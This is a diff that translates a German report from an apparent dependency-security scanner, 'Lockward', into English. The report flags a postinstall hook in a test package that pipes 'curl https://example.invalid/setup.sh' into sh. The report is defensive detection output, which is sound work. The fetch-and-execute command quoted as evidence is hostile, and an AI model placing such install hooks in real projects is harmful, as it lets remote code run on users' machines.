@@ -1,29 +1,29 @@
 ## Lockward
 
-**Ziel:** `{root}`
+**Target:** `{root}`
 
-**Zeitpunkt:** 2026-10-12T00:00:00Z
+**Scanned at:** 2026-10-12T00:00:00Z
 
 **Score:** 50 (high)
 
-**Gate:** Warning · Exit 1 · Modus warn
+**Gate:** Warning · Exit 1 · mode warn
 
-### Warum
+### Why
 
-- `Paket mini-app@1.0.0 Hook 'postinstall': der Hook spricht mit dem Netzwerk oder lädt Daten herunter. Beleg: 'curl https://example.invalid/setup.sh | sh'.`
-- `Paket mini-app@1.0.0 Hook 'postinstall': der Hook leitet einen Download in eine Shell. Beleg: 'curl https://example.invalid/setup.sh | sh'.`
-- **advisory_coverage:** `1 Pakete nicht gegen OSV geprüft (offline, kein/stale Cache).`
-- **no_outbound_build:** `Hook 'postinstall' in mini-app@1.0.0 lädt während der Installation aus dem Netz, ohne den Inhalt auszuführen (LW-H003).`
-- **no_outbound_build:** `Hook 'postinstall' in mini-app@1.0.0 führt heruntergeladenen Inhalt in einer Shell aus (LW-H004).`
+- `Package mini-app@1.0.0 hook 'postinstall' contacts the network or downloads data. Evidence: 'curl https://example.invalid/setup.sh | sh'.`
+- `Package mini-app@1.0.0 hook 'postinstall' pipes a download into a shell. Evidence: 'curl https://example.invalid/setup.sh | sh'.`
+- **advisory_coverage:** `1 package was not checked against OSV (offline, no cache entry or a stale cache).`
+- **no_outbound_build:** `Package mini-app@1.0.0 hook 'postinstall' downloads during install and does not execute the content (LW-H003).`
+- **no_outbound_build:** `Package mini-app@1.0.0 hook 'postinstall' pipes downloaded content into a shell (LW-H004).`
 
-### Install-Hooks
+### Install hooks
 
 - `mini-app`@`1.0.0` `postinstall`: `curl https://example.invalid/setup.sh | sh`
 
 ### Advisories
 
-Keine bekannten Advisories im Cache.
+No advisories in the cache.
 
-### Hinweise
+### Notes
 
-- `new_dependencies: keine Baseline übergeben, die Regel ist für diesen Lauf inaktiv.`
+- `new_dependencies is inactive for this run because no baseline was passed.`
